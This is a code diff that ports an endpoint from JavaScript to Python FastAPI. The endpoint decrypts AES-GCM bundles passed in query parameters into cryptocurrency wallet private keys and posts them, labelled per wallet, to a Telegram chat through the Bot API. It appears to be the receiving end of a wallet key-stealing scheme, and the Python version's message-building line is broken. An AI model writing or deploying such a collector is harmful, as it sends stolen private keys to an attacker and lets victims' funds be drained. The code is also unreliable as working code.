@@ -1,70 +1,61 @@
-// File: api/messages.js
-import crypto from 'crypto';
+import base64
+import os
+import requests
+from fastapi import FastAPI, Request
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
-export default async function handler(req, res) {
-  try {
-    // 1. Parse incoming query strings
-    const bundlesJson   = decodeURIComponent(req.query.bundles || '[]');
-    const keybundleJson = decodeURIComponent(req.query.keybundle || '{}');
-    const sbundlesArr   = JSON.parse(bundlesJson);
-    const { bundleKey: keyB64 } = JSON.parse(keybundleJson);
+app = FastAPI()
 
-    // 2. Decode your AES key (dynamic per-request)
-    const key = Buffer.from(keyB64, 'base64');
+BASE58_ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
 
-    // 3. Base58 helper (Bitcoin alphabet)
-    const ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
-    function bytesToBase58(buf) {
-      let num = BigInt('0x' + buf.toString('hex')), out = '';
-      while (num > 0n) {
-        const rem = num % 58n;
-        num = num / 58n;
-        out = ALPHABET[Number(rem)] + out;
-      }
-      for (const b of buf) {
-        if (b === 0) out = '1' + out;
-        else break;
-      }
-      return out;
-    }
+TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
+TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
 
-    // 4. Decrypt each sbundle (iv:ct+tag)
-    const results = sbundlesArr.map((sb, i) => {
-      const [ivB64, ctB64] = sb.split(':');
-      const iv  = Buffer.from(ivB64, 'base64');
-      const ct  = Buffer.from(ctB64,  'base64');
-      const tag = ct.slice(-16);
-      const data= ct.slice(0, -16);
 
-      const dec = crypto.createDecipheriv('aes-256-gcm', key, iv);
-      dec.setAuthTag(tag);
-      const plain = Buffer.concat([dec.update(data), dec.final()]);
+def bytes_to_base58(b):
+    num = int.from_bytes(b, 'big')
+    encode = ''
+    while num > 0:
+        num, rem = divmod(num, 58)
+        encode = BASE58_ALPHABET[rem] + encode
+    pad = 0
+    for byte in b:
+        if byte == 0:
+            pad += 1
+        else:
+            break
+    return '1' * pad + encode
 
-      return {
-        hex:    plain.toString('hex'),
-        base58: bytesToBase58(plain)
-      };
-    });
 
-    // 5. Build the Telegram message
-    let text = '🔑 Decrypted keys:\n';
-    results.forEach((r, i) => {
-      text += `Wallet ${i}:\n  Hex: ${r.hex}\n  Base58: ${r.base58}\n`;
-    });
+@app.get("/api/messages")
+async def receive_data(bundles: str, keybundle: str, request: Request):
+    sbundles = bundles.split(",")
+    key = base64.b64decode(keybundle)
+    aesgcm = AESGCM(key)
 
-    // 6. Send via Telegram Bot API
-    const bot   = process.env.TELEGRAM_BOT_TOKEN;
-    const chat  = process.env.TELEGRAM_CHAT_ID;
-    const tgUrl = `https://api.telegram.org/bot${bot}/sendMessage`
-                + `?chat_id=${chat}`
-                + `&text=${encodeURIComponent(text)}`;
+    privkeys = []
+    for sbundle in sbundles:
+        try:
+            iv_b64, encrypted_b64 = sbundle.split(":")
+            iv = base64.b64decode(iv_b64)
+            ciphertext = base64.b64decode(encrypted_b64)
+            decrypted = aesgcm.decrypt(iv, ciphertext, None)
+            b58_priv = bytes_to_base58(decrypted)
+            privkeys.append(b58_priv)
+        except Exception:
+            continue
 
-    await fetch(tgUrl);
+    message = "\n".join([f"Wallet {i+1}:", key] for i, key in enumerate(privkeys))
 
-    // 7. Respond OK
-    res.status(200).json({ status: 'ok' });
-  } catch (e) {
-    console.error('❌ Error in /api/messages:', e);
-    res.status(500).json({ error: e.message });
-  }
-}
+    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        payload = {
+            "chat_id": TELEGRAM_CHAT_ID,
+            "text": message
+        }
+        try:
+            requests.post(url, data=payload)
+        except Exception:
+            pass
+
+    return {"status": "ok"}
